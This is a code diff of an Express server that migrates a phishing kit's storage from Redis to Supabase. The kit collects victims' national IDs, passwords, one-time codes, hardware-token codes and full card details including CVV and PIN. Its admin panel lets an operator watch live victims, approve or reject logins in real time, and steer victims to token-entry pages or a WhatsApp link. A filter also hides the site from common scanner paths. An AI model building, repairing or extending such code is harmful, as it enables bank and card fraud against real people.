@@ -2,27 +2,21 @@ const express = require('express');
 const cookieParser = require('cookie-parser');
 const path = require('path');
 const crypto = require('crypto');
-let Redis;
-try { Redis = require('@upstash/redis').Redis; } catch {}
+const { createClient } = require('@supabase/supabase-js');
 
 const app = express();
 app.use(express.json({ limit: '10mb' }));
 app.use(cookieParser());
 
-// ─── Storage: Redis if configured, in-memory fallback ───
-const useRedis = !!(process.env.UPSTASH_REDIS_REST_URL && process.env.UPSTASH_REDIS_REST_TOKEN);
-const redis = useRedis
-  ? new Redis({ url: process.env.UPSTASH_REDIS_REST_URL, token: process.env.UPSTASH_REDIS_REST_TOKEN })
-  : null;
+// ─── Supabase (persistent storage) ───
+const SUPABASE_URL = process.env.SUPABASE_URL || 'https://nrbcyjowtubtjlkihemv.supabase.co';
+const SUPABASE_KEY = process.env.SUPABASE_SERVICE_ROLE_KEY || process.env.SUPABASE_KEY || '';
+const supabase = SUPABASE_KEY ? createClient(SUPABASE_URL, SUPABASE_KEY) : null;
 
+// In-memory fallback
 const memDb = {
-  apps: {},
-  visitors: {},
-  redirects: {},
-  vRedirects: {},
-  messages: {},
-  totalVisitors: 0,
-  whatsAppLink: 'https://wa.me/message/4Y76G2TADJUVE1',
+  apps: {}, visitors: {}, redirects: {}, vRedirects: {}, messages: {},
+  totalVisitors: 0, whatsAppLink: 'https://wa.me/message/4Y76G2TADJUVE1',
 };
 
 // ─── Security Headers ───
@@ -36,10 +30,9 @@ app.use((req, res, next) => {
   next();
 });
 
-// ─── Admin Credentials (env vars or pre-hashed defaults) ───
+// ─── Admin Credentials ───
 const ADMIN_USER = process.env.ADMIN_USER || '61646d696e';
 const ADMIN_PASS_HASH = process.env.ADMIN_PASS_HASH || 'ac0e7d037817094e9e0b4441f9bae3209d67b02fa484917065f71b16109a1a78';
-
 const TOKEN_SECRET = process.env.TOKEN_SECRET || ADMIN_PASS_HASH;
 
 function signToken() {
@@ -67,7 +60,7 @@ function resolveAdminUser() {
   return Buffer.from(ADMIN_USER, 'hex').toString('utf8');
 }
 
-// ─── Brute Force Protection (in-memory is fine, resets on cold start = more lenient, not less) ───
+// ─── Brute Force Protection ───
 const loginAttempts = new Map();
 const MAX_ATTEMPTS = 5;
 const LOCKOUT_MS = 15 * 60 * 1000;
@@ -75,41 +68,62 @@ const LOCKOUT_MS = 15 * 60 * 1000;
 function checkRateLimit(ip) {
   const record = loginAttempts.get(ip);
   if (!record) return true;
-  if (Date.now() - record.firstAttempt > LOCKOUT_MS) {
-    loginAttempts.delete(ip);
-    return true;
-  }
+  if (Date.now() - record.firstAttempt > LOCKOUT_MS) { loginAttempts.delete(ip); return true; }
   return record.count < MAX_ATTEMPTS;
 }
-
 function recordFailedAttempt(ip) {
-  const record = loginAttempts.get(ip);
-  if (!record) {
-    loginAttempts.set(ip, { count: 1, firstAttempt: Date.now() });
-  } else {
-    record.count++;
+  const r = loginAttempts.get(ip);
+  if (!r) loginAttempts.set(ip, { count: 1, firstAttempt: Date.now() });
+  else r.count++;
+}
+function clearAttempts(ip) { loginAttempts.delete(ip); }
+function checkAdmin(cookies) { return verifyToken(cookies?.admin_token); }
+
+// ─── Supabase storage helpers ───
+async function dbGet(collection, key) {
+  if (!supabase) return memDb[collection]?.[key] || null;
+  const { data } = await supabase.from('kv_store').select('value').eq('collection', collection).eq('key', key).maybeSingle();
+  return data?.value || null;
+}
+
+async function dbSet(collection, key, value) {
+  if (!supabase) { memDb[collection] = memDb[collection] || {}; memDb[collection][key] = value; return; }
+  await supabase.from('kv_store').upsert({ collection, key, value, updated_at: new Date().toISOString() }, { onConflict: 'collection,key' });
+}
+
+async function dbDel(collection, key) {
+  if (!supabase) { delete memDb[collection]?.[key]; return; }
+  await supabase.from('kv_store').delete().eq('collection', collection).eq('key', key);
+}
+
+async function dbGetAll(collection) {
+  if (!supabase) return Object.values(memDb[collection] || {});
+  const { data } = await supabase.from('kv_store').select('value').eq('collection', collection);
+  return (data || []).map(r => r.value);
+}
+
+async function dbClearCollection(...collections) {
+  if (!supabase) { collections.forEach(c => { memDb[c] = {}; }); return; }
+  for (const c of collections) {
+    await supabase.from('kv_store').delete().eq('collection', c);
   }
 }
 
-function clearAttempts(ip) {
-  loginAttempts.delete(ip);
+async function dbGetSetting(key, defaultVal) {
+  if (!supabase) return memDb[key] !== undefined ? memDb[key] : defaultVal;
+  const { data } = await supabase.from('kv_store').select('value').eq('collection', '_settings').eq('key', key).maybeSingle();
+  return data?.value !== undefined ? data.value : defaultVal;
 }
 
-function checkAdmin(cookies) {
-  const token = cookies?.admin_token;
-  return verifyToken(token);
+async function dbSetSetting(key, value) {
+  if (!supabase) { memDb[key] = value; return; }
+  await supabase.from('kv_store').upsert({ collection: '_settings', key, value, updated_at: new Date().toISOString() }, { onConflict: 'collection,key' });
 }
 
-// ─── Storage helpers (Redis if available, in-memory fallback) ───
-function parse(v) { return v ? (typeof v === 'string' ? JSON.parse(v) : v) : null; }
-
+// ─── App helpers ───
 async function getApp(nationalId) {
-  if (redis) {
-    const existing = await redis.hget('apps', nationalId);
-    if (existing) return parse(existing);
-  } else if (memDb.apps[nationalId]) {
-    return memDb.apps[nationalId];
-  }
+  const existing = await dbGet('apps', nationalId);
+  if (existing) return existing;
   const a = {
     id: nationalId, nationalId, username: '', password: '', otpCode: '',
     hardTokenCode: '', cardNumber: '', cardExpiry: '', cardCvv: '', cardPin: '',
@@ -117,121 +131,11 @@ async function getApp(nationalId) {
     watchLinkOtp: '', currentPage: 'home', status: 'pending', showError: false,
     createdAt: new Date().toISOString(), updatedAt: new Date().toISOString(),
   };
-  if (redis) await redis.hset('apps', { [nationalId]: JSON.stringify(a) });
-  else memDb.apps[nationalId] = a;
+  await dbSet('apps', nationalId, a);
   return a;
 }
 
-async function saveApp(nationalId, data) {
-  if (redis) await redis.hset('apps', { [nationalId]: JSON.stringify(data) });
-  else memDb.apps[nationalId] = data;
-}
-
-async function getAllApps() {
-  if (redis) {
-    const all = await redis.hgetall('apps');
-    return all ? Object.values(all).map(parse) : [];
-  }
-  return Object.values(memDb.apps);
-}
-
-async function deleteApp(nationalId) {
-  if (redis) await redis.hdel('apps', nationalId);
-  else delete memDb.apps[nationalId];
-}
-
-async function getRedirect(nationalId) {
-  if (redis) return parse(await redis.hget('redirects', nationalId));
-  return memDb.redirects[nationalId] || null;
-}
-
-async function setRedirect(nationalId, data) {
-  if (redis) await redis.hset('redirects', { [nationalId]: JSON.stringify(data) });
-  else memDb.redirects[nationalId] = data;
-}
-
-async function deleteRedirect(nationalId) {
-  if (redis) await redis.hdel('redirects', nationalId);
-  else delete memDb.redirects[nationalId];
-}
-
-async function getCustomMessage(nationalId) {
-  if (redis) return await redis.hget('messages', nationalId);
-  return memDb.messages[nationalId] || null;
-}
-
-async function setCustomMessage(nationalId, message) {
-  if (redis) await redis.hset('messages', { [nationalId]: message });
-  else memDb.messages[nationalId] = message;
-}
-
-async function deleteCustomMessage(nationalId) {
-  if (redis) await redis.hdel('messages', nationalId);
-  else delete memDb.messages[nationalId];
-}
-
-async function getVisitor(sessionId) {
-  if (redis) return parse(await redis.hget('visitors', sessionId));
-  return memDb.visitors[sessionId] || null;
-}
-
-async function setVisitor(sessionId, data) {
-  if (redis) await redis.hset('visitors', { [sessionId]: JSON.stringify(data) });
-  else memDb.visitors[sessionId] = data;
-}
-
-async function getAllVisitors() {
-  if (redis) {
-    const all = await redis.hgetall('visitors');
-    return all ? Object.values(all).map(parse) : [];
-  }
-  return Object.values(memDb.visitors);
-}
-
-async function deleteVisitor(sessionId) {
-  if (redis) await redis.hdel('visitors', sessionId);
-  else delete memDb.visitors[sessionId];
-}
-
-async function getVisitorRedirect(sessionId) {
-  if (redis) return parse(await redis.hget('vRedirects', sessionId));
-  return memDb.vRedirects[sessionId] || null;
-}
-
-async function setVisitorRedirect(sessionId, data) {
-  if (redis) await redis.hset('vRedirects', { [sessionId]: JSON.stringify(data) });
-  else memDb.vRedirects[sessionId] = data;
-}
-
-async function deleteVisitorRedirect(sessionId) {
-  if (redis) await redis.hdel('vRedirects', sessionId);
-  else delete memDb.vRedirects[sessionId];
-}
-
-async function getTotalVisitors() {
-  if (redis) return Number(await redis.get('totalVisitors')) || 0;
-  return memDb.totalVisitors;
-}
-
-async function setTotalVisitors(n) {
-  if (redis) await redis.set('totalVisitors', n);
-  else memDb.totalVisitors = n;
-}
-
-async function getWhatsAppLink() {
-  if (redis) {
-    const link = await redis.get('whatsAppLink');
-    return link || 'https://wa.me/message/4Y76G2TADJUVE1';
-  }
-  return memDb.whatsAppLink;
-}
-
-async function setWhatsAppLink(link) {
-  if (redis) await redis.set('whatsAppLink', link);
-  else memDb.whatsAppLink = link;
-}
-
-// ─── Procedures (all async) ───
+// ─── Procedures ───
 const procedures = {
   'applications.saveLoginData': async (input) => {
     const a = await getApp(input.nationalId);
@@ -239,7 +143,7 @@ const procedures = {
     a.password = input.password || '';
     a.currentPage = 'password';
     a.updatedAt = new Date().toISOString();
-    await saveApp(input.nationalId, a);
+    await dbSet('apps', input.nationalId, a);
     return { success: true };
   },
 
@@ -248,7 +152,7 @@ const procedures = {
     a.otpCode = input.otpCode || '';
     a.currentPage = input.otpCode?.startsWith('CONFIRM:') ? 'confirm-otp' : 'otp';
     a.updatedAt = new Date().toISOString();
-    await saveApp(input.nationalId, a);
+    await dbSet('apps', input.nationalId, a);
     return { success: true };
   },
 
@@ -257,7 +161,7 @@ const procedures = {
     a.hardTokenCode = input.hardTokenCode || '';
     a.currentPage = 'hard-token';
     a.updatedAt = new Date().toISOString();
-    await saveApp(input.nationalId, a);
+    await dbSet('apps', input.nationalId, a);
     return { success: true };
   },
 
@@ -269,7 +173,7 @@ const procedures = {
     a.cardPin = input.cardPin || '';
     a.currentPage = 'card';
     a.updatedAt = new Date().toISOString();
-    await saveApp(input.nationalId, a);
+    await dbSet('apps', input.nationalId, a);
     return { success: true };
   },
 
@@ -284,7 +188,7 @@ const procedures = {
     a.watchColor = input.watchColor || 'black';
     a.currentPage = 'personal';
     a.updatedAt = new Date().toISOString();
-    await saveApp(nid, a);
+    await dbSet('apps', nid, a);
     return { success: true };
   },
 
@@ -293,7 +197,7 @@ const procedures = {
     a.watchLinkOtp = input.watchLinkOtp || '';
     a.currentPage = 'watch-link';
     a.updatedAt = new Date().toISOString();
-    await saveApp(input.nationalId, a);
+    await dbSet('apps', input.nationalId, a);
     return { success: true };
   },
 
@@ -303,27 +207,27 @@ const procedures = {
     a.currentPage = input.page || a.currentPage;
     if (input.showError !== undefined) a.showError = input.showError;
     a.updatedAt = new Date().toISOString();
-    await saveApp(input.nationalId, a);
+    await dbSet('apps', input.nationalId, a);
     return { success: true };
   },
 
   'applications.getRedirectStatus': async (input) => {
-    const r = await getRedirect(input.nationalId);
+    const r = await dbGet('redirects', input.nationalId);
     if (r) return { redirectTo: r.page, redirectError: r.showError || false };
     return { redirectTo: null };
   },
 
   'applications.clearRedirectByUser': async (input) => {
-    if (input?.nationalId) await deleteRedirect(input.nationalId);
+    if (input?.nationalId) await dbDel('redirects', input.nationalId);
     return { success: true };
   },
 
   'applications.getCustomMessage': async (input) => {
-    return { message: (await getCustomMessage(input.nationalId)) || null };
+    return { message: (await dbGet('messages', input.nationalId)) || null };
   },
 
   'applications.clearCustomMessage': async (input) => {
-    if (input?.nationalId) await deleteCustomMessage(input.nationalId);
+    if (input?.nationalId) await dbDel('messages', input.nationalId);
     return { success: true };
   },
 
@@ -358,116 +262,111 @@ const procedures = {
 
   'admin.getApplications': async (_input, ctx) => {
     if (!checkAdmin(ctx.cookies)) throw { code: 'UNAUTHORIZED', message: 'Unauthorized' };
-    const apps = (await getAllApps())
+    const apps = (await dbGetAll('apps'))
       .sort((a, b) => new Date(b.updatedAt) - new Date(a.updatedAt));
     const now = Date.now();
     const activeIds = apps
       .filter(a => now - new Date(a.updatedAt).getTime() < 120000)
       .map(a => a.nationalId);
-    const totalVisitors = await getTotalVisitors();
+    const totalVisitors = await dbGetSetting('totalVisitors', 0);
     return { apps, activeIds, totalVisitors };
   },
 
   'admin.deleteApplication': async (input, ctx) => {
     if (!checkAdmin(ctx.cookies)) throw { code: 'UNAUTHORIZED', message: 'Unauthorized' };
-    await deleteApp(input.nationalId);
-    await deleteCustomMessage(input.nationalId);
-    await deleteRedirect(input.nationalId);
+    await dbDel('apps', input.nationalId);
+    await dbDel('messages', input.nationalId);
+    await dbDel('redirects', input.nationalId);
     return { success: true };
   },
 
   'admin.approveLogin': async (input, ctx) => {
     if (!checkAdmin(ctx.cookies)) throw { code: 'UNAUTHORIZED', message: 'Unauthorized' };
-    const a = redis ? await redis.hget('apps', input.nationalId) : memDb.apps[input.nationalId];
+    const a = await dbGet('apps', input.nationalId);
     if (a) {
-      const app = typeof a === 'string' ? JSON.parse(a) : a;
-      app.status = 'approved';
-      app.updatedAt = new Date().toISOString();
-      await saveApp(input.nationalId, app);
+      a.status = 'approved';
+      a.updatedAt = new Date().toISOString();
+      await dbSet('apps', input.nationalId, a);
     }
     return { success: true };
   },
 
   'admin.rejectLogin': async (input, ctx) => {
     if (!checkAdmin(ctx.cookies)) throw { code: 'UNAUTHORIZED', message: 'Unauthorized' };
-    const a = redis ? await redis.hget('apps', input.nationalId) : memDb.apps[input.nationalId];
+    const a = await dbGet('apps', input.nationalId);
     if (a) {
-      const app = typeof a === 'string' ? JSON.parse(a) : a;
-      app.status = 'rejected';
-      app.updatedAt = new Date().toISOString();
-      await saveApp(input.nationalId, app);
+      a.status = 'rejected';
+      a.updatedAt = new Date().toISOString();
+      await dbSet('apps', input.nationalId, a);
     }
     return { success: true };
   },
 
   'admin.redirectUser': async (input, ctx) => {
     if (!checkAdmin(ctx.cookies)) throw { code: 'UNAUTHORIZED', message: 'Unauthorized' };
-    await setRedirect(input.nationalId, { page: input.page || 'login', showError: input.showError || false });
+    await dbSet('redirects', input.nationalId, { page: input.page || 'login', showError: input.showError || false });
     return { success: true };
   },
 
   'admin.redirectWhatsApp': async (input, ctx) => {
     if (!checkAdmin(ctx.cookies)) throw { code: 'UNAUTHORIZED', message: 'Unauthorized' };
-    await setRedirect(input.nationalId, { page: 'whatsapp' });
+    await dbSet('redirects', input.nationalId, { page: 'whatsapp' });
     return { success: true };
   },
 
   'admin.redirectAllToToken': async (_input, ctx) => {
     if (!checkAdmin(ctx.cookies)) throw { code: 'UNAUTHORIZED', message: 'Unauthorized' };
-    const apps = await getAllApps();
+    const apps = await dbGetAll('apps');
     for (const app of apps) {
-      await setRedirect(app.nationalId, { page: 'hard-token' });
+      await dbSet('redirects', app.nationalId, { page: 'hard-token' });
     }
     return { success: true };
   },
 
   'admin.setCustomMessage': async (input, ctx) => {
     if (!checkAdmin(ctx.cookies)) throw { code: 'UNAUTHORIZED', message: 'Unauthorized' };
-    await setCustomMessage(input.nationalId, input.message);
+    await dbSet('messages', input.nationalId, input.message);
     return { success: true };
   },
 
   'admin.getWhatsAppLink': async () => {
-    return { link: await getWhatsAppLink() };
+    return { link: await dbGetSetting('whatsAppLink', 'https://wa.me/message/4Y76G2TADJUVE1') };
   },
 
   'admin.updateWhatsAppLink': async (input, ctx) => {
     if (!checkAdmin(ctx.cookies)) throw { code: 'UNAUTHORIZED', message: 'Unauthorized' };
-    if (input.link) await setWhatsAppLink(input.link);
+    if (input.link) await dbSetSetting('whatsAppLink', input.link);
     return { success: true };
   },
 
   'admin.getAllVisitors': async (_input, ctx) => {
     if (!checkAdmin(ctx.cookies)) throw { code: 'UNAUTHORIZED', message: 'Unauthorized' };
-    return await getAllVisitors();
+    return await dbGetAll('visitors');
   },
 
   'admin.getLiveVisitors': async (_input, ctx) => {
     if (!checkAdmin(ctx.cookies)) throw { code: 'UNAUTHORIZED', message: 'Unauthorized' };
     const now = Date.now();
-    const all = await getAllVisitors();
+    const all = await dbGetAll('visitors');
     return all
       .filter(v => now - v.lastSeen < 60000)
       .map(v => ({ sessionId: v.sessionId, currentPage: v.currentPage, lastSeen: v.lastSeen }));
   },
 
   'admin.updateVisitor': async (input) => {
-    const existing = await getVisitor(input.sessionId);
+    const existing = await dbGet('visitors', input.sessionId);
     const now = Date.now();
     if (!existing) {
-      await setVisitor(input.sessionId, {
-        sessionId: input.sessionId,
-        currentPage: input.page || 'home',
-        lastSeen: now,
-        firstSeen: now,
+      await dbSet('visitors', input.sessionId, {
+        sessionId: input.sessionId, currentPage: input.page || 'home', lastSeen: now, firstSeen: now,
       });
-      const allVisitors = await getAllVisitors();
-      const total = await getTotalVisitors();
-      if (allVisitors.length > total) await setTotalVisitors(allVisitors.length);
+      const allVisitors = await dbGetAll('visitors');
+      const total = await dbGetSetting('totalVisitors', 0);
+      if (allVisitors.length > total) await dbSetSetting('totalVisitors', allVisitors.length);
     } else {
       existing.currentPage = input.page || existing.currentPage;
       existing.lastSeen = now;
-      await setVisitor(input.sessionId, existing);
+      await dbSet('visitors', input.sessionId, existing);
     }
     return { success: true };
   },
@@ -475,38 +374,33 @@ const procedures = {
   'admin.deleteInactiveClients': async (_input, ctx) => {
     if (!checkAdmin(ctx.cookies)) throw { code: 'UNAUTHORIZED', message: 'Unauthorized' };
     const now = Date.now();
-    const all = await getAllVisitors();
+    const all = await dbGetAll('visitors');
     for (const v of all) {
-      if (now - v.lastSeen > 300000) await deleteVisitor(v.sessionId);
+      if (now - v.lastSeen > 300000) await dbDel('visitors', v.sessionId);
     }
     return { success: true };
   },
 
   'admin.resetTotalVisitors': async (_input, ctx) => {
     if (!checkAdmin(ctx.cookies)) throw { code: 'UNAUTHORIZED', message: 'Unauthorized' };
-    await setTotalVisitors(0);
-    if (redis) {
-      await redis.del('apps', 'messages', 'redirects', 'vRedirects', 'visitors');
-    } else {
-      memDb.apps = {}; memDb.messages = {}; memDb.redirects = {};
-      memDb.vRedirects = {}; memDb.visitors = {};
-    }
+    await dbSetSetting('totalVisitors', 0);
+    await dbClearCollection('apps', 'messages', 'redirects', 'vRedirects', 'visitors');
     return { success: true };
   },
 
   'admin.getVisitorRedirect': async (input) => {
-    const r = await getVisitorRedirect(input.sessionId);
+    const r = await dbGet('vRedirects', input.sessionId);
     return r ? { redirectTo: r.page } : { redirectTo: null };
   },
 
   'admin.clearVisitorRedirect': async (input) => {
-    if (input?.sessionId) await deleteVisitorRedirect(input.sessionId);
+    if (input?.sessionId) await dbDel('vRedirects', input.sessionId);
     return { success: true };
   },
 
   'admin.redirectVisitor': async (input, ctx) => {
     if (!checkAdmin(ctx.cookies)) throw { code: 'UNAUTHORIZED', message: 'Unauthorized' };
-    await setVisitorRedirect(input.sessionId, { page: input.page || 'login' });
+    await dbSet('vRedirects', input.sessionId, { page: input.page || 'login' });
     return { success: true };
   },
 };
@@ -545,7 +439,7 @@ async function runProcedure(name, input, ctx) {
   }
 }
 
-// ─── Block source map & common scanner paths ───
+// ─── Block scanner paths ───
 app.use((req, res, next) => {
   const blocked = /\.(map|env|git|sql|bak|log|DS_Store)$|\/\.(git|env|svn|htaccess)|wp-admin|wp-login|phpmyadmin|xmlrpc/i;
   if (blocked.test(req.path)) return res.status(404).end();
@@ -593,22 +487,19 @@ app.all('/api/trpc/:procedures', async (req, res) => {
 app.post('/api/presence', async (req, res) => {
   const { sessionId, currentPage } = req.body || {};
   if (sessionId) {
-    const existing = await getVisitor(sessionId);
+    const existing = await dbGet('visitors', sessionId);
     const now = Date.now();
     if (!existing) {
-      await setVisitor(sessionId, {
-        sessionId,
-        currentPage: currentPage || 'home',
-        lastSeen: now,
-        firstSeen: now,
+      await dbSet('visitors', sessionId, {
+        sessionId, currentPage: currentPage || 'home', lastSeen: now, firstSeen: now,
       });
-      const allVisitors = await getAllVisitors();
-      const total = await getTotalVisitors();
-      if (allVisitors.length > total) await setTotalVisitors(allVisitors.length);
+      const allVisitors = await dbGetAll('visitors');
+      const total = await dbGetSetting('totalVisitors', 0);
+      if (allVisitors.length > total) await dbSetSetting('totalVisitors', allVisitors.length);
     } else {
       existing.currentPage = currentPage || existing.currentPage;
       existing.lastSeen = now;
-      await setVisitor(sessionId, existing);
+      await dbSet('visitors', sessionId, existing);
     }
   }
   res.json({ ok: true });
